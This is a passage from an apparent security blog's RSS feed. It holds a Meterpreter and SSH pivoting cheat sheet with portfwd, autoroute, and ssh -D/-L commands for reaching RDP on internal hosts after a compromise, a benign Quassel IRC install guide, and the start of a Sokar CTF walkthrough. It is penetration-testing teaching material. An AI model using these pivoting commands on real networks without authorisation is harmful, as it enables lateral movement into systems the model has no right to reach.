 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Session manipulation failed: Validation failed: Address is reserved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/validations.rb:56:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;save!&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/attribute_methods/dirty.rb:33:in `save!'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;block in save!'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:313:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;block &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;with_transaction_returning_status&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/database_statements.rb:192:in `transaction'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:208:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;transaction'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:311:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;with_transaction_returning_status&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in `save!'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:377:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;block in report_host'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;with_connection&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:323:in `report_host'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2031:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;block in report_event'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;with_connection&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2025:in `report_event'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:222:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;report_event'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:331:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;session_event&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:408:in `block in on_session_output'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;each'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;on_session_output&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;each'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;method_missing&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/msf/core/session_manager.rb:242:in `block in register'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;call'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;print_error&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:436:in `unknown_command'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:411:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;run_single'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:68:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;block &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;interact&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `call'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;run'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:66:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;interact&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/msf/base/sessions/meterpreter.rb:396:in `_interact'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/rex/ui/interactive.rb:49:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;interact'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/core.rb:1745:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cmd_sessions&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;block in run_single'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;each&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/exploit.rb:142:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cmd_exploit'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;run_command&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;each'&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;run_single&lt;span class=&quot;s1&quot;&gt;'&quot;, &quot;/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:200:in `run'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;&lt;/span&gt;/opt/metasploit/apps/pro/msf3/msfconsole:148:in &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;main&amp;gt;'&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;meterpreter-pivoting-cheatsheet&quot;&gt;Meterpreter Pivoting Cheatsheet&lt;/h2&gt;

&lt;p&gt;Assuming you’ve compromised the target machine and have a meterpreter shell, you can pivot through it by setting up a &lt;strong&gt;meterpreter port forward&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;portfwd add –l 3389 –p 3389 –r target-host&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;portfwd delete  –l 3389 –p 3389 –r target-host&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;portfwd flush&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter delete all port forwards&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;portfwd list&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter list active port forwards&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;run autoroute -s 192.168.15.0/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Use Meterpreters autoroute script to add the route for specified subnet &lt;code&gt;192.168.15.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;run autoroute -p&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter list all active routes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;route&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter view available networks the compromised host can access&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;route add 192.168.14.0 255.255.255.0 3&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter add route for 192.168.14.0/24 via Session 3.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;route delete 192.168.14.0 255.255.255.0 3&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter delete route for 192.168.14.0/24 via Session 3.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;route flush&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter delete all routes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Meterpreter Port Forwards are flakey&lt;/h5&gt;
  &lt;p&gt;Meterpreter port forwards can be a bit flakey, also the meterpreter session needs to be remain open.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;In order to connect to the compromised machine you would run:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Connect to RDP via Meterpreter Port Forward&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;rdesktop 127.0.0.1&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h2 id=&quot;pivoting-example-diagrams&quot;&gt;Pivoting Example Diagrams&lt;/h2&gt;

&lt;p&gt;Pivoting can be a bit hard to understand on paper, so here are some diagrams for clarification with the associated commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UVoxUFl.png&quot; alt=&quot;Brace for Wonky Visio Arrows&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;starting-point&quot;&gt;Starting Point&lt;/h3&gt;

&lt;p&gt;You’ll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/zRIqADW.png&quot; alt=&quot;SSH Pivot Example 1: Starting Point&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;routing-traffic-to-the-same-subnet&quot;&gt;Routing Traffic to the Same Subnet&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TXV6ehn.png&quot; alt=&quot;Pivot Example 2: Routing traffic to the same subnet&quot; /&gt;&lt;/p&gt;

&lt;p&gt;####Example commands&lt;/p&gt;

&lt;h5 id=&quot;ssh-pivoting-using-proxychains&quot;&gt;SSH Pivoting using Proxychains&lt;/h5&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Dynamic SSH Pivoting Command using proxy chains&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;ssh -D 127.0.0.1:9050 root@192.168.2.2&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;You could then connect to Target 2’s RDP server using:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Connecting to RDP via Proxychains Dynamic Port Forwarding&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;proxychains rdesktop 192.168.2.3&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h5 id=&quot;ssh-port-forwarding-command&quot;&gt;SSH Port Forwarding Command&lt;/h5&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;RDP SSH Port Forwarding&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;ssh -L 3389:192.168.2.3:3389 user@192.168.2.2&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;You could then connect to Target 2’s RDP server using:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Connecting to RDP via SSH Port Forwarding&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;rdesktop 127.0.0.1&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h3 id=&quot;ssh-and-meterpreter-pivoting&quot;&gt;SSH and Meterpreter Pivoting&lt;/h3&gt;

&lt;p&gt;This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gyylQup.png&quot; alt=&quot;Pivot Example 3: Using SSH and Meterpreter Pivoting to access another subnet&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;example-commands&quot;&gt;Example commands&lt;/h4&gt;

&lt;p&gt;The above commands would be leveraged to reach &lt;strong&gt;Target 2&lt;/strong&gt;, from &lt;strong&gt;Target 2&lt;/strong&gt; to &lt;strong&gt;Target 3&lt;/strong&gt;, meterpreter would be used. Follow the &lt;a href=&quot;https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet&quot;&gt;meterpreter portwarding example&lt;/a&gt; above for a MS08-067 example.&lt;/p&gt;

&lt;p&gt;If this was helpfull, click tweet below.&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>HowTo Install Quassel on Ubuntu</title>
          <link>https://highon.coffee/blog/howto-install-quassel-ubuntu/</link>
          <pubDate>Fri, 20 Mar 2015 00:52:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>Ubuntu</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/howto-install-quassel-ubuntu/</guid>
          <description>&lt;p&gt;&lt;strong&gt;Quassel IRC&lt;/strong&gt;, comes in two parts an IRC client and a bouncer called “Quassel Core”. Quassel Core works like a BNC, ZNC bouncer keeping your chats / channels online while you’re client machine is disconnected. GUI Quassel Clients are available for Windows, Linux and OSX - which was the deal breaker for me.&lt;/p&gt;

&lt;p&gt;Setting Quassel up from source proved to be a bit of nightmare and I spent a fair amount of time getting this right, so I thought I’d share my notes on setting up Quassel Core on Ubuntu.&lt;/p&gt;

&lt;h2 id=&quot;install-quassel-ppa-ubuntu-repository&quot;&gt;Install Quassel PPA Ubuntu Repository&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;add-apt-repository ppa:mamarley/quassel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;install-quassel-core-on-ubuntu&quot;&gt;Install Quassel Core on Ubuntu&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;quassel-core&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check it’s running:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;netstat &lt;span class=&quot;nt&quot;&gt;-tulpn&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Quassels default port is 4242:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;tcp6       0      0 :::4242                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Connect your Quassel Client to your server and follow the setup wizard.&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Sokar - Walkthrough</title>
          <link>https://highon.coffee/blog/sokar-walkthrough/</link>
          <pubDate>Mon, 23 Feb 2015 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/sokar-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#description&quot; id=&quot;markdown-toc-description&quot;&gt;Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#shellshock&quot; id=&quot;markdown-toc-shellshock&quot;&gt;Shellshock&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#identify-current-user&quot; id=&quot;markdown-toc-identify-current-user&quot;&gt;Identify Current User&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#shellshock-home-dir-perms&quot; id=&quot;markdown-toc-shellshock-home-dir-perms&quot;&gt;Shellshock home dir perms&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#shellshock-files-owned-by-user-bynarr&quot; id=&quot;markdown-toc-shellshock-files-owned-by-user-bynarr&quot;&gt;Shellshock files owned by user bynarr&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#shellshock-mail-spool-readable&quot; id=&quot;markdown-toc-shellshock-mail-spool-readable&quot;&gt;Shellshock mail spool readable&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#shellshock-local-privilege-escalation&quot; id=&quot;markdown-toc-shellshock-local-privilege-escalation&quot;&gt;Shellshock Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;Sokar was a vulnhub competition, unfortunately I did not have enough free time to compete.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @_RastaMouse&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

